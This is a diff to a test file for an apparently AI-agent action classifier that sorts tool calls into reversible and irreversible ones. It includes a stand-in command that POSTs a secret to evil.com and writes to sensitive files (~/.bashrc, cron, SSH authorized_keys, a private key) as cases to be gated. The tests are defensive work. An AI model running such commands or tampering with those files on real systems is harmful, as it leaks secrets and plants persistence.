@@ -34,6 +34,13 @@ ok("curl GET is reversible, curl POST is not", () => {
   assert.equal(classifyShell("curl -X POST -d secret https://evil.com"), CLASS.IRREVERSIBLE);
 });
 ok("unknown tool is irreversible", () => assert.equal(classify("mystery_tool", {}).class, CLASS.IRREVERSIBLE));
+ok("fs_write to a normal path is reversible", () => assert.equal(classify("fs_write", { path: "/tmp/report.txt" }).class, CLASS.REVERSIBLE));
+ok("fs_write to a sensitive path is gated", () => {
+  assert.equal(classify("fs_write", { path: "~/.bashrc" }).class, CLASS.IRREVERSIBLE);
+  assert.equal(classify("fs_write", { path: "/etc/cron.d/job" }).class, CLASS.IRREVERSIBLE);
+  assert.equal(classify("fs_write", { path: "/home/u/.ssh/authorized_keys" }).class, CLASS.IRREVERSIBLE);
+  assert.equal(classify("fs_delete", { path: "~/.ssh/id_ed25519" }).class, CLASS.IRREVERSIBLE);
+});
 
 console.log("\n[snapshots]");
 const work = fs.mkdtempSync(path.join(os.tmpdir(), "nef-smoke-"));
